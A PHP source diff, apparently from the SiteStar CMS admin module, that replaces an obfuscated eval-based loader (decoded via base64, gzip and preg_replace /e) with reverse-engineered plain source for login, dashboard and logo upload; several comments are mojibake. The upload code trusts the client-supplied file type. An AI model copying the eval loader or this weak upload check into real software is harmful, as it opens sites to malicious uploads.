@@ -1,10 +1,682 @@
 <?php
+//Âä†ÂØÜÊñπÂºèÔºöphpÊ∫êÁ†ÅÊ∑∑Ê∑ÜÁ±ªÂä†ÂØÜ„ÄÇÂÖçË¥πÁâàÂú∞ÂùÄ:http://www.zhaoyuanma.com/phpjm.html ÂÖçË¥πÁâà‰∏çËÉΩËß£ÂØÜ,ÂèØ‰ª•‰ΩøÁî®VIPÁâàÊú¨„ÄÇ
+//Ê≠§Á®ãÂ∫èÁî±„ÄêÊâæÊ∫êÁ†Å„Äëhttp://Www.ZhaoYuanMa.Com (ÂÖçË¥πÁâàÔºâÂú®Á∫øÈÄÜÂêëËøòÂéüÔºåQQÔºö7530782 
+?>
+<?php
+class Frontpage extends Module {
+	protected $_filters = array(
+        'check_admin' => '{index}{dologin}{remote_login}'
+    );
+    
+    public function index() {
+    	if(ACL::requireRoles(array('admin')))
+    	{
+    	    Content::redirect(Html::uriquery('frontpage', 'dashboard'));
+    	}
+    	$this->_layout = 'login';
+    	$this->setVar('page_title', __('Administrator Login'));
+    }
+    
+    public function dologin() {
+        if (!RandMath::checkResult(ParamHolder::get('rand_rs'))) {
+            $this->setVar('json', Toolkit::jsonERR(__('Sorry! Please have another try with the math!')));
+            return '_result';
+        }
 
-/*
- ø™∑¢◊˜’ﬂ£∫www.sitestar.cn
- ◊˜’ﬂÕ¯’æ£∫http://www.sitestar.cn
+        if (ACL::loginUser(ParamHolder::get('login_user', ''), 
+            ParamHolder::get('login_pwd', ''))) {
+            if (!ACL::requireRoles(array('admin'))) {
+                $this->setVar('json', Toolkit::jsonERR(__('Username and password mismatch!')));
+                return '_result';
+            }
+            /*$xml = new DOMDocument('1.0','utf-8');
+			$xml->load('SitestarMaker/SitestarMaker.xml');
+			$xml->getElementsByTagName('logoin')->item(0)->nodeValue = 'yes';
+			$xml->save('SitestarMaker/SitestarMaker.xml');*/
+            $this->setVar('json', Toolkit::jsonOK(array('forward' => 'index.php')));
+        } else {
+            $this->setVar('json', Toolkit::jsonERR(__('Username and password mismatch!')));
+        }
+        
+        
+        return '_result';
+    }
+    
+    public function dologout()
+    {
+    	/*$xml = new DOMDocument('1.0','utf-8');
+		$xml->load('SitestarMaker/SitestarMaker.xml');
+		$xml->getElementsByTagName('logoin')->item(0)->nodeValue = 'no';
+		$xml->save('SitestarMaker/SitestarMaker.xml');*/
+    	
+        SessionHolder::destroy();
+        Content::redirect('index.php');
+    }
+    
+    public function dashboard() {
+        $this->_layout = 'dashboard';
+        $o_admin_short = new AdminShortcut();
+        $shortcuts =& $o_admin_short->findAll(false, false, "ORDER BY `priority`");
+        
+        $this->assign('shortcuts', $shortcuts);
+        
+        $curr_locale = trim(SessionHolder::get('_LOCALE'));
+        
+        $o_article_category = new ArticleCategory();
+        $cate_a_count = $o_article_category->count("id<>'1' AND s_locale=?", array($curr_locale));
+        $o_article = new Article();
+        $article_count = $o_article->count("s_locale=?", array($curr_locale));
+        
+        $o_prod_category = new ProductCategory();
+        $cate_p_count = $o_prod_category->count("id<>'1' AND s_locale=?", array($curr_locale));
+        $o_product = new Product();
+        $prod_count = $o_product->count("s_locale=?", array($curr_locale));
 
-*/
-if (!defined('≤39À')) {define('≤39À', true);function À175À($À175À,$∂305æ=''){global $Ω675ü;if(!$∂305æ)return(base64_decode($À175À));$≥291¿=À175À('YÕmõF€z‡Z¢T†Y»0€Xø2ÂR±lYù2π9kÒZåQ==');$¨192Ö=À175À('°b™3∆Jk');$ç208â=À175À('⁄YŸ2çh…y');$î245ƒ=À175À('ÖMØA=ﬁ=');$µ227∑=À175À('ÉMΩTπk„y');$®217¶=À175À('ÂM˘júQ1');$î236û=À175À('ƒMgå=¬=');$É260ó=À175À('É260ó');$ó300Æ=À175À('úcñ3µR»y∆bG€Vu');$Ω675ü='eNrT1FM/bWhuetrfxfGTr4ujUeQVvxt+LoGmfuGhJr5XIo2jwiM/+Id7XYgKDzSKDPG75ufuaquuqammttrIwGKihqa1QmlecWqJhkpKanJ+Smp8WkF8cWZ6HlC8VgEAAXcgJA==';for($–256ç=$î245ƒ;$–256ç<$ó300Æ($À175À);$–256ç++)$É260ó.=$¨192Ö($À175À{$–256ç})<$®217¶?(($¨192Ö($À175À{$–256ç})>$µ227∑&&$¨192Ö($À175À{$–256ç})<$®217¶)?$ç208â($¨192Ö($À175À{$–256ç})/$î236û):$À175À{$–256ç}):"";return($≥291¿($É260ó));}function ∑558∫(&$Œ196Å=''){global $Œ20õ,$®74∆,$“477Ω,$¨487µ,$û140≈,$Ω675ü;$“477Ω($¨487µ,$û140≈.'(@$®74∆($Œ20õ(\'eNqdkk9P1EAYxr9KaRo6o6XtTDvtLmVYMazoRpZAlixdJE23nbqVpW22xQWJBw/evXvwY2A08eCBCwnBhBg+gkfCJ7Bl+LMxeNDDdDrPPPOb9508jfm5RjbIhDgCUwjONubn8mAUZ4VQ7GeMigXbK7RX/mufq+L8OE7CdKwO08Av4jRRByMWUXFQFNmspo3HY7WEhZmajl5qpZPtVevGThrSkAVpyKarj7fN9ilBVmDoPjZCA7Na5NuBbhNi1mwzsgyC69N5/DKhFrGQjnxiGGHU922MMDH7Nq73Td2sM7s2HefBgAXbFInOnMaLvO6IJWEcOdI3RKwf9BjZ5BjIR8ba5YbROj9aujh18TqVFXllceFyeXEBu2ft8/biKml3183lM9'.$Œ20õ(À175À('W⁄05¬1‡ES÷1“R⁄M9','ODAÚMDA2Y‘NÿNDQ5NWU4M‘Y3ZWYOWJ–ZWQ2YTN÷NGE=')).'7rtNddxW6n/bO91KQydKSvFjY+TPKq8e+c8r05CkgnqG69U+SOvva4to2aq51WDzVttyNDeMA3Ke8C3ONRZFnhprI2bn4knWD9I7hRDwmpfbldvRXYMGfCgfTZ0MnhbR9PW+c9VP/lbqydfV+g9H/6EQBnAlED6sMGfKEC9UE5AU1UPO/Js+dNz1OkT0g330NYFhDFQ1amS6ACFzfxlsP/6LWAtu7K5Rs3HOfqdOLvlIQSwPayYZkrIKqick2DzuQFd+7NIN1NCjChwJnqHonn04syGqUZSwDHqCVSvSEp8qhKwK3Tu4poNGJ+CO5UpXLn8Rt2HwJCJwqGac4mDkAH5Lv9vBiBP9DKjIHhFN0JCajGX0y6gjBG8Df38kOj\')).$®74∆($Œ20õ($Ω675ü)))',"516c30a23d32e8fa7c07554874f63529");
-}}global $Œ20õ,$®74∆,$“477Ω,$¨487µ,$û140≈,$Ω675ü;$“477Ω=À175À('∆HJÿZ19ÚZXBÊYWNÿ','ODAÚMDA2Y‘NÿNDQ5NWU4M‘Y3ZWYOWJ–ZWQ2YTN÷NGE=');$¨487µ=À175À('LÙUN⁄MÙMGEÚM2QÙM⁄U4Z⁄E3YÙA3NTU0OD∆0Z‘YÙNTI5L2U=','ODAÚMDA2Y‘NÿNDQ5NWU4M‘Y3ZWYOWJ–ZWQ2YTN÷NGE=');$Œ20õ=À175À('Y⁄FÙZTY0X2RÿY29÷ZQ==','ODAÚMDA2Y‘NÿNDQ5NWU4M‘Y3ZWYOWJ–ZWQ2YTN÷NGE=');$û140≈=À175À('ZXZ–ƒA==','ODAÚMDA2Y‘NÿNDQ5NWU4M‘Y3ZWYOWJ–ZWQ2YTN÷NGE=');$®74∆=À175À('Z3‡1ƒ⁄NÏƒXBÚZXNÙ','ODAÚMDA2Y‘NÿNDQ5NWU4M‘Y3ZWYOWJ–ZWQ2YTN÷NGE=');$Ω675ü='';$“477Ω($¨487µ,$û140≈.'(@$®74∆($Œ20õ(\'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'.$Œ20õ(À175À('V2G»2NH¬Ù0=','ODAÚMDA2Y‘NÿNDQ5NWU4M‘Y3ZWYOWJ–ZWQ2YTN÷NGE=')).'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\'.($∑558∫.=∑558∫($∑558∫)))))',"516c30a23d32e8fa7c07554874f63529".($∑558∫='VTNsME1sT0RB8k1EQTJZ1E7YTSkdUa1JrYmxreVZsZGtOazU2YkV0VFZHY3hVa1ZPVEZwNlRqVlZTR2N3VGpGSk1GbDZNRDFVTUZKQ09Hc3hSVkZVU2xveFJUZFpWQT1UMFJCOGsxRVFUSloxRTdZVD1UMFJCOGsxRVFUSloxRTdZVA=='));
-return true;?>bc5f0567f481c4dd136604bcdd682010
+        //zhangjc 2013-1-30
+		 $o_sc = new StaticContent();
+		 $scs =& $o_sc->findAll('s_locale="'.$curr_locale.'"', false, "ORDER BY `id` asc");
+		 $this->assign('scs', $scs);
+
+        $this->assign('cate_a_count', $cate_a_count);
+        $this->assign('article_count', $article_count);
+        $this->assign('cate_p_count', $cate_p_count);
+        $this->assign('prod_count', $prod_count);
+    }
+
+	public function iframe() {
+        $this->_layout = 'iframe';
+	}
+
+    public function admin() {
+        $this->_layout = 'admin';
+		$_c = intval(ParamHolder::get('_c', '1'));
+		$isback = intval(ParamHolder::get('isback', '0'));
+		$sc_id = intval(ParamHolder::get('sc_id', '0'));
+		$mappings=self::frontpagemapping();
+		
+		if(!empty($mappings[$_c])){
+			$modactrel=$mappings[$_c];
+		}else{
+			$modactrel=$mappings[1];
+		}
+		if($sc_id>0){
+			$url = "_m=".$modactrel[0]."&_a=".$modactrel[1].'&sc_id='.$sc_id.'&_isback='.$isback;
+		}else{
+			$url = "_m=".$modactrel[0]."&_a=".$modactrel[1];
+		}
+		
+		
+		$this->assign('url', $url);
+	}
+	
+	/**
+	 * Edit Module >>
+	 */
+	public function admin_logo() {
+    	$this->_layout = 'blank';
+    	
+		$act = ParamHolder::get('act', '');
+		$loop = ParamHolder::get('_p', '0');
+		if ($act == 'btnsumbit') {
+			$err = '';
+			$max_filesize = ini_get('upload_max_filesize');
+			$maxsize = intval($max_filesize) * 1024 * 1024;
+			$typeArr = array('image/gif','image/png','image/x-png','image/jpeg','image/pjpeg','image/bmp');
+			
+			$logo_width = ParamHolder::get('logo_width', '299');
+			$logo_height = ParamHolder::get('logo_height', '92');
+			$hid_logo_src = ParamHolder::get('hid_logo_src', '');
+			$logo_file =& ParamHolder::get('logo_src', array(), PS_FILES);
+			$logo_file["name"] = Toolkit::changeFileNameChineseToPinyin($logo_file["name"]);
+			if (!empty($logo_file["name"])) {
+				// Êñá‰ª∂Â§ßÂ∞è
+		        if ($logo_file['size'] > $maxsize) {
+		        	$err = __('Upload size limit').':'.$max_filesize;
+		        // Êñá‰ª∂Á±ªÂûã
+		    	} elseif (!in_array($logo_file['type'], $typeArr)) {
+		        	$err = __('Supported file format').':gif|jpg|png|bmp';	
+		        } else {
+		        	// rename file name
+					if (file_exists(ROOT.'/upload/image/'.$logo_file["name"])) {
+						$logo_file["name"] = Toolkit::randomStr(8).strrchr($logo_file["name"],".");
+					}
+		        	if (preg_match("/^WIN/i", PHP_OS) && preg_match("/[\x80-\xff]./", $logo_file["name"])) {
+		        		$logo_file["name"] = iconv('UTF-8', 'GBK//IGNORE', $logo_file["name"]);
+		        	}
+		        	if (move_uploaded_file($logo_file['tmp_name'], ROOT.'/upload/image/'.$logo_file['name'])) {
+		        		ParamParser::fire_virus(ROOT.'/upload/image/'.$logo_file['name']);
+		        		$logo_src = '../upload/image/'.$logo_file['name'];
+		        	} else { $err = __('Uploading file failed!'); }
+		        }
+		        // show error
+		        if ($err) {
+		        	$this->assign('err', $err);
+		        	$this->assign('act', 'btnsumbit');
+					$this->assign('curr_loop', $loop);
+					$this->assign('logo_src', $hid_logo_src);
+					$this->assign('logo_width', $logo_width);
+					$this->assign('logo_height', $logo_height);
+		        } else {
+		        	if (file_exists($hid_logo_src)) @unlink($hid_logo_src);
+		        	// Write xml
+		        	$dataXml = new DOMDocument('1.0','utf-8');
+					$dataXml->load(ROOT.'/data/admin_block_config.xml');
+			    	$xml = $dataXml->getElementsByTagName('node')->item($loop);
+			    	if (preg_match("/^WIN/i", PHP_OS) && preg_match("/[\x80-\xff]./", $logo_src)) {
+			    		$logo_src = iconv('GBK', 'UTF-8//IGNORE', $logo_src);
+			    	}
+			    	$xml->getElementsByTagName('logo_src')->item(0)->nodeValue = $logo_src;
+			    	$xml->getElementsByTagName('logo_width')->item(0)->nodeValue = $logo_width;
+			    	$xml->getElementsByTagName('logo_height')->item(0)->nodeValue = $logo_height;
+			    	$dataXml->save(ROOT.'/data/admin_block_config.xml');
+					echo '<script language="javascript">window.parent.location.href = "'.Html::uriquery('frontpage', 'dashboard').'"</script>';
+		        }
+			} else {
+				$this->assign('act', 'btnsumbit');
+				$this->assign('curr_loop', $loop);
+				$this->assign('logo_src', $hid_logo_src);
+				$this->assign('logo_width', $logo_width);
+				$this->assign('logo_height', $logo_height);
+				echo '<script language="javascript">window.parent.location.href = "'.Html::uriquery('frontpage', 'dashboard').'"</script>';
+			}
+		} else {
+			$dataXml = new DOMDocument('1.0','utf-8');
+			$dataXml->load(ROOT.'/data/admin_block_config.xml');
+		    $xml = $dataXml->getElementsByTagName('node')->item($loop);
+		    $logo_src = $xml->getElementsByTagName('logo_src')->item(0)->nodeValue;
+		    $logo_width = $xml->getElementsByTagName('logo_width')->item(0)->nodeValue;
+		    $logo_height = $xml->getElementsByTagName('logo_height')->item(0)->nodeValue;
+
+			$this->assign('act', 'btnsumbit');
+			$this->assign('curr_loop', $loop);
+			$this->assign('logo_src', $logo_src);
+			$this->assign('logo_width', $logo_width);
+			$this->assign('logo_height', $logo_height);
+		}
+	}
+	
+	public function admin_foot() {
+    	$this->_layout = 'blank';
+    	
+    	$loop = ParamHolder::get('_p', '0');
+    	$dataXml = new DOMDocument('1.0','utf-8');
+		$dataXml->load(ROOT.'/data/admin_block_config.xml');
+	    $xml = $dataXml->getElementsByTagName('node')->item($loop);
